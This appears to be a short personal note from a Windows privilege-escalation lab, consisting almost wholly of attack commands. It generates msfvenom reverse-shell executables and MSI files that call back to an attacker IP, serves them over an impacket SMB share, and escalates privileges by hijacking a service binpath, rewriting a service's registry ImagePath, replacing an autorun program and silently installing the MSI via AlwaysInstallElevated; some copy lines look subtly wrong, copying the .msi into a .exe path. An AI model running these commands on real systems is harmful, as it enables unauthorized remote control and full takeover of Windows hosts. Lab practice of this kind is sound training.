---
title: "windowsPrivEsc"
tags:
  - fetus
---
## initial access with [[xfreerdp]]

```sh
xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.201.8.171
```
## payload generation with [[msfvenom]] and transfer with [[impacket]] 

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.110.172 LPORT=1337 -f exe -o rev.exe
```

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.110.172 LPORT=1337 -f msi -o rev.msi
```

```sh
smbserver.py root .
```

```sh
copy \\10.14.110.172\root\rev.msi C:\PrivEsc\rev.exe
copy \\10.14.110.172\root\rev.msi C:\PrivEsc\rev.msi
```
## service exploits
#### insecure service perms 
#### Unquoted service path 
#### weak registry perms
#### insecure service executables
## registry 
#### Autoruns
#### AlwaysInstallElevated

```sh
sc config filepermsvc binpath= "\"C:\PrivEsc\rev.exe\""
```

```sh
accesschk.exe -quvwd "C:\Program Files\Unquoted Path Service"
```

```sh
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\rev.exe /f
```

```sh
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

```sh
copy C:\PrivEsc\rev.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

```sh
msiexec /quiet /qn /i C:\PrivEsc\rev.msi
```
